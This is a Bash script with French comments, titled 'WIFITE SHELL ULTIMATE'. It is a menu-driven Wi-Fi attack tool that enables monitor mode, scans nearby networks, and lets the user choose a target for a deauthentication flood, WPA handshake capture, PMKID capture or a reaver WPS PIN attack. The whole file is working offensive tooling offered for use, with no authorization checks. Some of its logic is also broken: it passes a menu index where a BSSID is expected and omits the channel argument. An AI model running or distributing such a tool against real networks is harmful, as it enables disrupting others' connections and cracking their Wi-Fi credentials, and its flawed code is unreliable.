#!/bin/bash
# ===========================================
#   WIFITE SHELL ULTIMATE
#   Auteur: Levi
#   Version: 2.1
#   Date: 2025
# ===========================================

set -euo pipefail

# Dossiers et fichiers
TMPDIR=$(mktemp -d)
LOGDIR="./wifite_logs"
mkdir -p "$LOGDIR"
HANDSHAKE_DIR="$LOGDIR/handshakes"
PMKID_DIR="$LOGDIR/pmkid"
LOGFILE="$LOGDIR/session_$(date +%F_%H-%M-%S).log"

# Couleurs
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
CYAN=$(tput setaf 6)
RESET=$(tput sgr0)

# Trap interruptions
cleanup() {
    echo -e "\n${CYAN}[*] Nettoyage en cours...${RESET}"
    pkill -f "airodump-ng" || true
    pkill -f "aireplay-ng" || true
    pkill -f "hcxdumptool" || true
    pkill -f "reaver" || true
    if [[ -n "${MON_INTERFACE:-}" ]]; then
        airmon-ng stop "$MON_INTERFACE" &>/dev/null || true
    fi
    restore_network
    # chmod uniquement si dossier existe et non vide
    if [ -d "$LOGDIR" ] && [ "$(ls -A "$LOGDIR")" ]; then
        chmod 600 "$LOGDIR"/*
    fi
    rm -rf "$TMPDIR"
    echo "${GREEN}[*] Fini.${RESET}"
}
trap cleanup EXIT INT TERM

# Bannière
banner() {
    if command -v figlet &>/dev/null; then
        figlet -f slant "WIFITE SHELL"
    else
        echo -e "\n===== WIFITE SHELL =====\n"
    fi
}

# Vérif outils
check_deps() {
    for cmd in airmon-ng airodump-ng aireplay-ng iw dialog; do
        if ! command -v "$cmd" &>/dev/null; then
            echo "${RED}[!] Erreur: $cmd manquant.${RESET}"
            exit 1
        fi
    done
}

# Restaure réseau
restore_network() {
    if systemctl list-unit-files | grep -q NetworkManager; then
        systemctl start NetworkManager || true
    elif systemctl list-unit-files | grep -q wpa_supplicant; then
        systemctl start wpa_supplicant || true
    fi
}

# Choix via dialog
menu_dialog() {
    dialog --clear --title "$1" --menu "$2" 20 60 10 "${@:3}" 2>&1 >/dev/tty
}

# Choix interface
choose_interface() {
    interfaces=($(iw dev | grep Interface | awk '{print $2}'))
    options=()
    for i in "${interfaces[@]}"; do
        options+=("$i" "Interface Wi-Fi")
    done
    if [[ ${#interfaces[@]} -eq 0 ]]; then
        echo "${RED}[!] Pas d'interface détectée.${RESET}"
        exit 1
    fi
    menu_dialog "Sélection Interface" "Choisis l'interface à utiliser" "${options[@]}"
}

# Activer mode monitor
enable_monitor() {
    iface="$1"
    airmon-ng check kill
    airmon-ng start "$iface" >/dev/null
    echo "${CYAN}[*] Mode monitor activé sur $iface${RESET}"
}

# Scan réseaux
scan_networks() {
    dialog --infobox "Scan des réseaux en cours (10 sec)..." 5 50
    airodump-ng --write "$TMPDIR/scan" --output-format csv "$MON_INTERFACE" >/dev/null &
    PID=$!
    sleep 10
    kill $PID
}

# Liste réseaux
list_networks() {
    file="$TMPDIR/scan-01.csv"
    awk -F',' '/WPA|WEP|OPN/ {print NR,$1,$4,$6,$9,$14}' "$file" | sed 's/ //g'
}

# Choix réseau
choose_network() {
    networks=($(list_networks))
    options=()
    i=1
    while read -r line; do
        bssid=$(echo "$line" | awk -F',' '{print $2}')
        ssid=$(echo "$line" | awk -F',' '{print $6}')
        options+=("$i" "$ssid ($bssid)")
        ((i++))
    done < <(awk -F',' '/WPA|WEP/ {print $0}' "$TMPDIR/scan-01.csv")
    menu_dialog "Sélection Réseau" "Choisis une cible" "${options[@]}"
}

# Attaque Deauth
deauth_attack() {
    dialog --infobox "Lancement attaque Deauth..." 5 50
    aireplay-ng --deauth 10 -a "$1" "$MON_INTERFACE" >>"$LOGFILE" 2>&1
}

# Capture Handshake
capture_handshake() {
    mkdir -p "$HANDSHAKE_DIR"
    dialog --infobox "Capture du handshake..." 5 50
    airodump-ng --bssid "$1" -c "$2" -w "$HANDSHAKE_DIR/handshake" "$MON_INTERFACE"
}

# Attaque PMKID
attack_pmkid() {
    mkdir -p "$PMKID_DIR"
    dialog --infobox "Attaque PMKID..." 5 50
    hcxdumptool -i "$MON_INTERFACE" -o "$PMKID_DIR/pmkid.pcapng" --enable_status=1
}

# Attaque WPS
attack_wps() {
    dialog --infobox "Attaque WPS avec reaver..." 5 50
    reaver -i "$MON_INTERFACE" -b "$1" -vv >>"$LOGFILE" 2>&1
}

# Main
main() {
    banner
    check_deps
    iface=$(choose_interface)
    enable_monitor "$iface"
    MON_INTERFACE="${iface}mon"
    scan_networks
    target=$(choose_network)
    dialog --menu "Choisis l'attaque" 20 60 10 \
        1 "Deauth" \
        2 "Handshake" \
        3 "PMKID" \
        4 "WPS" 2> "$TMPDIR/choice"
    choice=$(<"$TMPDIR/choice")
    case $choice in
    1) deauth_attack "$target" ;;
    2) capture_handshake "$target" ;;
    3) attack_pmkid ;;
    4) attack_wps "$target" ;;
    esac
}

main
